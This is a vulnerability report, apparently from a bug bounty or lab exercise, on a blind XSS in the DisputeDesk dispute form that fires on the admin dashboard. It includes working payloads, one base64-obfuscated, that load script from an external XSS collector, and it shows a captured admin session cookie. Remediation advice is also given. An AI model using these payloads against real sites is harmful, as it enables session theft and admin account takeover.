## Title
Blind XSS in Dispute Filing Form Fields - DisputeDesk

## Description
**Affected URL:** https://disputedesk.pwnedbox.site/file.php (triggers on https://disputedesk.pwnedbox.site/admin/index.php)

A Blind Cross-Site Scripting (XSS) vulnerability exists in the dispute filing form on `disputedesk.pwnedbox.site`. Input submitted in the **Name** field (as well as **What happened?**, **Desired resolution**, and **Evidence summary**) is stored without HTML encoding and renders directly in the DOM when an administrator views the case operations dashboard in the backend (`/admin/index.php`). Because the script executes inside an authenticated admin session and `PHPSESSID` lacks the `HttpOnly` flag, an attacker can exfiltrate the administrator's session cookie and compromise the admin panel.

## Steps to Reproduce
1. Go to `https://disputedesk.pwnedbox.site/file.php`, fill in the required fields with a Blind XSS payload in **Name**, **What happened?**, **Desired resolution**, and **Evidence summary**, and click **Submit dispute**.
2. Log in to the admin panel (`https://disputedesk.pwnedbox.site/admin/index.php`).
3. Observe the payload execute immediately upon loading the dashboard under **Latest cases**, sending an out-of-band callback with the admin's `PHPSESSID` cookie and page details.

## POC (Proof of Concept)
**Injection Endpoint:** `https://disputedesk.pwnedbox.site/file.php` (`Name`, `What happened?`, `Desired resolution`, and `Evidence summary` fields)

**Trigger Endpoint:** `https://disputedesk.pwnedbox.site/admin/index.php`

**Payload:**
```html
"><script src=[https://xss.report/c/havemercy](https://xss.report/c/havemercy)></script>
```
*(Alternative payload submitted in What happened? and Evidence summary: `"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3JhcGlkbmV3dDYzMTAxIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>`)*

**Out-of-Band Callback Data Captured:**
- **Triggered URI:** `https://disputedesk.pwnedbox.site/admin/index.php`
- **Referrer:** `https://disputedesk.pwnedbox.site/admin/login.php`
- **Exfiltrated Session Cookie:** `PHPSESSID=6d14c4caaad5311713d2d2e212b68d75`

**Visual Evidence:**
- Dispute filing form on `disputedesk.pwnedbox.site/file.php` with the Blind XSS payloads entered in **Name**, **What happened?**, **Desired resolution**, and **Evidence summary**.
  <img width="1262" height="1022" alt="image" src="https://github.com/user-attachments/assets/04e95ac1-7e76-4a53-bf5c-7af44b1b08d1" /><br><br>

- Admin case operations dashboard (`/admin/index.php`) rendering the injected payload directly in the **CLAIMANT** column (`"`), alongside Browser Storage showing `PHPSESSID` with `HttpOnly` set to `false`.
  <img width="1897" height="852" alt="image" src="https://github.com/user-attachments/assets/a1bb1a8c-2ae3-4cac-b946-36d0df8f5964" /><br><br>

- Blind XSS collector report confirming execution on `/admin/index.php` and capturing the admin's `PHPSESSID` cookie and screenshot.
  <img width="1545" height="1092" alt="image" src="https://github.com/user-attachments/assets/67cc155e-957b-4e48-8594-e80a554238f5" /><br>


## Impact
Because the payload executes automatically as soon as an administrator opens the admin dashboard without needing to click into an individual dispute case:
- **Admin Account Takeover:** Attackers can steal the administrator's `PHPSESSID` cookie and hijack their active session.
- **Unauthorized Data Access:** Full access to view, download, or modify all submitted dispute cases, transaction references, supporting evidence, and claimant details.
- **Persistent Compromise:** Attackers can use the hijacked admin session to alter case priorities, update dispute statuses, or make unauthorized changes across the application.

## Remediation
1. **Encode Output:** Apply `htmlspecialchars($input, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')` to all user-supplied dispute fields (`Name`, `What happened?`, `Desired resolution`, and `Evidence summary`) before rendering them in `/admin/index.php` and case detail pages.
2. **Protect Session Cookies:** Set the `HttpOnly`, `Secure`, and `SameSite=Strict` flags on `PHPSESSID` so JavaScript cannot access session tokens via `document.cookie`.
3. **Add a Content Security Policy (CSP):** Enforce a strict CSP header on `/admin/` pages (e.g., `default-src 'self'; script-src 'self';`) to block unauthorized external script sources and inline event handlers.
